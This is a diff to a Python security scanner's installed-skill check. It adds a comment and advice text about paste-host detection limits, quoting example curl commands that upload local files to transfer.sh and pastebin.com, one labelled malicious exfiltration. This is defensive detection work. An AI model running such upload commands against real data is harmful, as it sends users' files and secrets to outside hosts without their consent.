@@ -4865,15 +4865,47 @@ def check_installed_skills(ctx: Context) -> Finding:
     }
     if crit:
         extra = f" (+{len(crit) - 6} more)" if len(crit) > 6 else ""
+        # B-555, accepted §2.5 residual: when a paste/transfer host is what convicted,
+        # STATE the limit instead of letting the reader infer certainty we do not have.
+        # The ticket's benign example -- a SUPPORT.md telling a human `curl --upload-file
+        # ./build.log https://transfer.sh/build.log` -- and the malicious
+        # `curl -F 'api_paste_code=@data.txt' https://pastebin.com/...` are one command,
+        # one local file, one paste host, one upload flag: THE SAME STATIC SHAPE. Five
+        # fixes were attempted and every one retracted, each because it traded this false
+        # FAIL for a real false negative -- the measurements are recorded next to
+        # `_EXFIL_HOST_TRANSFER_CMD_RE` above.
+        #
+        # Disclosure is the only mitigation left that is not an unsound guess, and it is
+        # also the only one that reaches this reader: measured, a --vet FAIL never enters
+        # the judge packet at all, and the vet judge contract permits it to ESCALATE a
+        # finding only, never to lower one. So "route it to adjudication" -- the standing
+        # answer for a WARN -- cannot relieve a FAIL.
+        #
+        # It goes in the ADVICE and not the detail, deliberately: `baseline.fingerprint()`
+        # hashes `Finding.detail`, so writing it there would re-fingerprint every existing
+        # paste-host finding and orphan the `.clawseccheckignore` entries users have
+        # already recorded against them. The advice field carries no such contract.
+        fix = (
+            "Uninstall the flagged skill(s) NOW and rotate any secrets they could reach "
+            "(channel tokens, 1Password, cloud keys). Only reinstall skills whose source "
+            "you have read."
+        )
+        if crit_hosts_by_skill:
+            fix += (
+                " One hit here is a paste or file-transfer host this skill reaches, and "
+                "that signal has a known limit: an upload command written to tell a HUMAN "
+                "where to send a log is the same static shape as one the skill runs by "
+                "itself, and no static scan separates them. If you authored this skill or "
+                "already trust its source, read the flagged line and confirm who it "
+                "addresses and which file it sends; otherwise treat it as above."
+            )
         return _b13_verdict(
             CRITICAL,
             FAIL,
             "Dangerous code in an installed skill — this is the ClawHavoc class: "
             + "; ".join(crit[:6])
             + extra,
-            "Uninstall the flagged skill(s) NOW and rotate any secrets they could reach "
-            "(channel tokens, 1Password, cloud keys). Only reinstall skills whose source "
-            "you have read.",
+            fix,
             crit,
             _signal_buckets,
             "crit",
